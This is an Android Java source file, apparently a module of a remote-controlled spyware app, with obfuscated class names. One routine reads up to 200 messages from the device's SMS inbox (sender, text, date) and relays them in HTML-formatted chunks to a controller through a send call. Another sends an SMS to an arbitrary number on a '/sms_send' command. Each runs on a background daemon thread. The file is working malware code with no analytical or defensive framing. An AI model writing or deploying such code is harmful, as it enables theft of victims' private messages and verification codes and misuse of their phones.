// language: Java, file: j.java, target: Android 16 (SDK 36)
package com.v2ram;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;

public class j {

    public static void dump() {
        async(() -> dumpSync());
    }

    public static void sendSms(String number, String body) {
        if (number == null || number.isEmpty() || body == null) {
            e.err("usage: /sms_send NUM TEXT");
            return;
        }
        async(() -> {
            Context c = d.ctx;
            if (c == null) return;
            if (c.checkSelfPermission(Manifest.permission.SEND_SMS)
                != PackageManager.PERMISSION_GRANTED) {
                d.send("<i>err: SEND_SMS not granted</i>");
                return;
            }
            try {
                android.telephony.SmsManager sm = c.getSystemService(
                    android.telephony.SmsManager.class);
                if (sm == null) sm = android.telephony.SmsManager.getDefault();
                sm.sendTextMessage(number, null, body, null, null);
                d.send("<i>sms sent to</i> <code>"
                    + d.esc(number) + "</code>");
            } catch (Throwable t) {
                e.err(t.getMessage());
            }
        });
    }

    static void dumpSync() {
        Context c = d.ctx;
        if (c == null) return;
        if (c.checkSelfPermission(Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED) {
            d.send("<i>err: READ_SMS not granted</i>");
            return;
        }
        Cursor cur = null;
        try {
            cur = c.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                new String[] { "_id", "address", "body", "date" },
                null, null, "date DESC LIMIT 200");
            if (cur == null) { d.send("<i>sms: null cursor</i>"); return; }
            StringBuilder b = new StringBuilder();
            b.append("<b>SMS inbox</b> (").append(cur.getCount()).append(")\n\n");
            int n = 0;
            while (cur.moveToNext()) {
                String addr = cur.getString(1);
                String body = cur.getString(2);
                long date = cur.getLong(3);
                b.append("<b>").append(d.esc(addr)).append("</b> ")
                 .append("<i>").append(fmtDate(date)).append("</i>\n")
                 .append(d.esc(trunc(body, 400))).append("\n───\n");
                n++;
                if (n % 25 == 0 && b.length() > 3000) {
                    d.send(b.toString());
                    b.setLength(0);
                }
            }
            if (b.length() > 0) d.send(b.toString());
        } catch (Throwable t) {
            e.err(t.getMessage());
        } finally {
            if (cur != null) try { cur.close(); } catch (Throwable ignored) {}
        }
    }

    static String fmtDate(long ms) {
        try {
            return new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm",
                java.util.Locale.US).format(new java.util.Date(ms));
        } catch (Throwable t) { return "?"; }
    }

    static String trunc(String s, int n) {
        if (s == null) return "";
        return s.length() <= n ? s : s.substring(0, n) + "…";
    }

    static void async(Runnable r) {
        Thread t = new Thread(r, "v2-sms");
        t.setDaemon(true);
        t.start();
    }
}